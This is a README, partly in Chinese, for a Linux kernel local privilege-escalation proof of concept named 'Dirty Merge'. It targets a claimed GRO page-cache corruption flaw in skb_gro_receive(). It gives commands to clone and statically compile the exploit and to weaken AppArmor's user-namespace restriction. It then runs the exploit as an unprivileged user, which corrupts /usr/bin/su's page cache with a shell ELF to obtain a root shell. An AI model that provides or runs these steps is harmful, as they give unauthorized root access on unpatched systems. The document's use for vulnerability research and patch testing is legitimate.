# Dirty Merge PoC

Linux内核 `skb_gro_receive()` 函数在处理GRO时，未能正确传播 `SKBFL_SHARED_FRAG` 标志，导致页缓存污染。攻击者可通过此漏洞破坏只读文件的页缓存，进而实现本地提权。


## 编译

```bash
git clone https://github.com/Apursuit/Dirty-Merge.git
cd Dirty-Merge
gcc -O2 -Wall -Wextra -static -o dirty_merge gro_fragnesia.c
```


## 补充

编译报错或运行报错缺失ethtool时，可以尝试使用静态编译版本（x86）

```bash
export PATH=$(pwd):$PATH
chmod +x ethtool
chmod +x dirty_merge
./dirty_merge
```

## Requirements

- Linux kernel with CONFIG_XFRM, CONFIG_INET_ESPINTCP, CONFIG_USER_NS
- User namespaces enabled (Ubuntu: `sysctl -w kernel.apparmor_restrict_unprivileged_userns=0`)
- `ip` (iproute2) and `ethtool` in PATH
- veth kernel module loaded

## Run

```bash
# As unprivileged user:
./dirty_merge
# Corrupts /usr/bin/su page cache with shell ELF, then execve's it -> root shell
```

## Restore

```bash
# As root:
echo 3 > /proc/sys/vm/drop_caches
```

## Tested on

- Ubuntu 24.04 LTS, kernel 6.8.0-49-generic
- Also affects: Linux 7.1-rc3 and all kernels with unpatched skb_gro_receive()